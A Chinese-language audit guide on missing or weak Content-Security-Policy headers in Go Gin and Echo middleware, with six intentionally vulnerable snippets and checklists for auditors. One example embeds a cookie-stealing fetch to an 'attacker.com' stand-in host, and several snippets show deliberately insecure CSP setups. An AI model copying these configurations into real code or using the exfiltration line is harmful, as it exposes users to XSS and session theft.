# Go 框架中间件 CSP 响应头配置缺失

## 基本信息
- **难度等级：** ★★☆☆☆ (初级)
- **审计时间：** 10-15分钟

## 🚀 30秒快速清单
- [ ] 中间件是否设置了 `Content-Security-Policy` 响应头？
- [ ] 是否在所有路由上应用了该中间件？
- [ ] CSP 策略是否包含过于宽松的指令（`*`, `unsafe-inline`, `unsafe-eval`）？
- [ ] 是否正确处理中间件链的执行顺序？
- [ ] 中间件是否针对不同端点设置了不同的 CSP 策略？

## Details

### 漏洞成因
Gin、Echo 等主流Go框架提供了中间件机制，但开发者常在框架初始化中忽视安全响应头的配置。主要问题包括：中间件完全缺失导致CSP头未设置、中间件逻辑错误导致仅部分路由受保护、使用全局中间件但策略过于宽松（如 `script-src *`）、中间件应用顺序错误导致被其他中间件覆盖、以及对特定路由的特殊处理不当导致保护失效。本文档侧重于框架级别的HTTP安全响应头配置问题。

### 代码示例

```go
// 漏洞1：完全缺失CSP中间件
package main

import (
    "github.com/gin-gonic/gin"
)

func main() {
    router := gin.Default()

    // 直接注册路由，未设置任何安全响应头
    router.GET("/", func(c *gin.Context) {
        c.String(200, "Hello World")
    })

    router.GET("/api/data", func(c *gin.Context) {
        c.JSON(200, gin.H{"data": "sensitive"})
    })

    router.Run(":8080")
}
// 问题：所有响应中都缺失CSP头，XSS攻击可不受限制执行
```

```go
// 漏洞2：中间件中有条件设置CSP，导致漏掉某些路由
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 仅对特定路由设置CSP
        if c.Request.URL.Path == "/api/user" {
            c.Header("Content-Security-Policy", "default-src 'self'")
        }
        // 其他路由（/api/admin, /api/data等）未设置
        c.Next()
    }
}

func main() {
    router := gin.Default()
    router.Use(CSPMiddleware())

    router.GET("/api/user", func(c *gin.Context) {
        c.JSON(200, gin.H{"user": "data"})
    })

    router.GET("/api/admin", func(c *gin.Context) {
        // CSP头缺失，虽然有中间件但未被应用
        c.JSON(200, gin.H{"admin": "data"})
    })

    router.Run(":8080")
}
// 问题：中间件应用不一致，导致部分端点无保护
```

```go
// 漏洞3：CSP策略过于宽松，失去防护意义
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 使用通配符，等同于未设置保护
        c.Header("Content-Security-Policy", "script-src *; style-src *")
        c.Next()
    }
}

func main() {
    router := gin.Default()
    router.Use(CSPMiddleware())

    router.GET("/", func(c *gin.Context) {
        c.String(200, `
            <script src="https://attacker.com/malicious.js"></script>
        `)
    })

    router.Run(":8080")
}
// 问题：CSP存在但形同虚设，通配符允许任意源加载资源
```

```go
// 漏洞4：中间件执行顺序错误，CSP被后续中间件覆盖
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Content-Security-Policy", "default-src 'self'")
        c.Next()
    }
}

func CORSMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 错误地重写所有响应头，导致CSP丢失
        c.Writer.Header().Del("Content-Security-Policy")
        c.Header("Access-Control-Allow-Origin", "*")
        c.Next()
    }
}

func main() {
    router := gin.Default()

    // CSP中间件先注册，但CORS中间件删除了它
    router.Use(CSPMiddleware())
    router.Use(CORSMiddleware())

    router.GET("/", func(c *gin.Context) {
        c.String(200, "Hello")
    })

    router.Run(":8080")
}
// 问题：中间件链中的后续处理破坏了安全配置
```

```go
// 漏洞5：Echo框架中间件顺序问题
package main

import (
    "github.com/labstack/echo/v4"
)

func CSPMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
    return func(c echo.Context) error {
        c.Response().Header().Set("Content-Security-Policy", "default-src 'self'")
        return next(c)
    }
}

func main() {
    e := echo.New()

    // 中间件注册但在路由前，可能被路由处理器的响应头覆盖
    e.Use(CSPMiddleware)

    e.GET("/", func(c echo.Context) error {
        // 如果处理器中重设了响应头，CSP可能丢失
        c.Response().Header().Del("Content-Security-Policy")
        return c.String(200, "Hello")
    })

    e.Start(":8080")
}
// 问题：中间件设置的头部可被路由处理器覆盖
```

```go
// 漏洞6：使用unsafe-inline和unsafe-eval，完全失效
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 允许内联脚本和样式，CSP保护形同虚设
        c.Header("Content-Security-Policy",
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'")
        c.Next()
    }
}

func main() {
    router := gin.Default()
    router.Use(CSPMiddleware())

    router.GET("/", func(c *gin.Context) {
        c.String(200, `
            <script>
                // 攻击者注入的脚本直接执行
                fetch('https://attacker.com/steal?cookie=' + document.cookie);
            </script>
        `)
    })

    router.Run(":8080")
}
// 问题：允许内联脚本完全绕过CSP，变成摆设
```

### 快速定位核心操作

**【L1:关键词扫描】**
- **框架初始化**：`gin.Default()`, `gin.New()`, `echo.New()`, `fiber.New()` 的调用位置
- **中间件定义**：`func(c *gin.Context)`, `func(next echo.HandlerFunc)`, `func(*fiber.Ctx)` 开头的函数
- **响应头设置**：`c.Header()`, `c.Response().Header().Set()`, `c.Writer.Header()`, `ctx.Set()`
- **路由注册**：`router.GET()`, `router.POST()`, `e.GET()`, `app.Get()` 等
- **中间件应用**：`router.Use()`, `e.Use()`, `app.Use()` 全局中间件注册

### 快速定位保护机制

**【L2:跳读】**
- **CSP响应头出现**：搜索文件中是否存在字符串 `"Content-Security-Policy"` 或 `"CSP"`
- **中间件结构**：检查中间件函数是否在 `c.Header()` 之后调用了 `c.Next()`（否则后续处理器会覆盖）
- **中间件应用范围**：验证 `router.Use()` 是否在路由注册前调用（全局应用）
- **条件判断**：检查中间件内部是否有条件分支导致部分路由被跳过

**【L3:逐行读】**
- **策略完整性**：CSP 策略是否包含所有必要的指令（`default-src`, `script-src`, `style-src`, `img-src` 等）
- **源白名单验证**：检查是否使用了 `*`, `unsafe-inline`, `unsafe-eval`, `blob:`, `data:` 等危险指令
- **中间件链分析**：追踪多个中间件的执行顺序，检查是否存在后续中间件覆盖CSP头的情况
- **错误处理**：检查中间件中是否有 `return` 分支导致 `c.Next()` 不被执行

**【L4:跨模块追踪】**
- **全局配置文件**：查找是否有 `config.go`, `middleware.go`, `router.go` 等配置文件定义中间件
- **中间件注册点**：追踪所有 `router.Use()` 和 `e.Use()` 调用，确保全局应用
- **特殊路由处理**：检查是否有路由组（route group）有不同的中间件配置
- **依赖关系**：追踪不同中间件之间的依赖关系，确保CSP在最后应用

---

## Classify

### 确认漏洞（需满足以下任一条件）

1. **完全缺失CSP中间件**：整个应用中没有任何地方设置 `Content-Security-Policy` 响应头
2. **中间件存在但未应用**：CSP中间件定义了但未通过 `router.Use()` 注册到路由上
3. **中间件应用不完整**：使用条件分支（`if path == ...`）导致仅部分路由受保护
4. **策略过于宽松**：CSP使用 `*` 或 `unsafe-inline`，失去防护意义
5. **被后续中间件覆盖**：CSP头在中间件链中被删除或覆盖
6. **顺序错误导致失效**：中间件在路由处理后执行，路由处理器可以覆盖CSP头

**典型漏洞特征**：
- 应用代码中完全搜不到 `Content-Security-Policy` 字符串
- 存在 `CSPMiddleware` 函数定义但 `router.Use(CSPMiddleware)` 语句缺失
- 中间件内有条件判断：`if c.Request.URL.Path == ...` 导致特定路由无保护
- CSP策略为 `"script-src * style-src *"` 或包含 `'unsafe-inline'`
- 中间件链中存在 `c.Writer.Header().Del("Content-Security-Policy")`
- CORS中间件在CSP中间件后注册，导致头部被覆盖
- 路由处理器内部重新设置了响应头，覆盖了中间件的配置

### 误报排除

- ✗ CSP中间件已注册到 `router.Use()` 且在所有路由定义前
- ✗ CSP策略使用明确的白名单（如 `script-src 'self' https://cdn.example.com`）
- ✗ 避免使用 `*`, `'unsafe-inline'`, `'unsafe-eval'`
- ✗ 中间件正确使用了 `c.Next()` 允许后续处理
- ✗ 中间件链中后续处理器未删除或覆盖CSP头
- ✗ 特殊路由有针对性的更严格CSP策略，而非放宽策略
- ✗ 所有HTTP端点（包括错误处理）都被中间件保护
- ✗ 已在网关层或反向代理（Nginx/HAProxy）统一设置了CSP头

### 代码异味（需进一步验证）

- △ CSP策略包含 `report-uri` 或 `report-to`，但对应的收集端点缺失
- △ 中间件使用了 `*` 但注有注释解释原因（可能是临时调试代码）
- △ 不同的路由有不同的CSP策略但逻辑复杂容易出错
- △ 使用了第三方中间件库但未验证其CSP实现
- △ CSP策略是从环境变量或配置文件动态读取，但未验证其格式
- △ 中间件在错误处理（panic恢复）后可能不被执行

---

## Low Risk

### 给予低风险评级的场景

1. **完整的框架级CSP保护**
   - CSP中间件已全局注册（`router.Use(cspMiddleware)` 在路由定义前）
   - 策略采用明确的白名单：`script-src 'self'` 或 `script-src 'self' https://trusted-cdn.com`
   - 避免使用 `*`, `'unsafe-inline'`, `'unsafe-eval'`
   - 所有路由均被保护，无条件分支

2. **多层防护**
   - 应用层设置了CSP中间件
   - 同时在反向代理（Nginx）层通过 `add_header Content-Security-Policy ...` 强制设置
   - 浏览器级别的其他防护（如X-Content-Type-Options, X-Frame-Options）也已配置
   - 有定期的安全审计流程

3. **特殊场景的有理由宽松**
   - API-only服务（无HTML响应），不需要严格的脚本CSP
   - 内部管理系统，通过VPN/IP白名单访问，CSP宽松可接受
   - 开发/测试环境，生产环境有完整保护
   - 第三方iframe服务，在子域隔离且有明确文档说明

4. **动态CSP的安全实现**
   - CSP使用Nonce机制：`script-src 'nonce-{随机值}'` 每次请求不同
   - CSP使用Hash机制：`script-src 'sha256-{hash}'` 白名单化特定脚本
   - 动态策略有严格的输入验证，避免注入
   - 所有可信源都在白名单中显式列出

5. **框架自动化保护**
   - 使用如 `echo-middleware` 等现成的安全中间件库，已验证其实现
   - 框架（如Spring Security）有默认的安全响应头配置
   - 使用了WAF或API网关的强制CSP功能

6. **内网或受限场景**
   - 应用部署在内网，仅通过VPN访问
   - 已启用mTLS客户端证书认证
   - 网络级别已限制外部访问（防火墙白名单）
   - 定期渗透测试确认XSS防护有效

**评级建议**：即使评为低风险，也应在报告中指出CSP作为深度防御的重要性，建议在公网暴露的服务上必须部署CSP。如果完全缺失CSP且无其他XSS防护机制，应评为中危及以上。
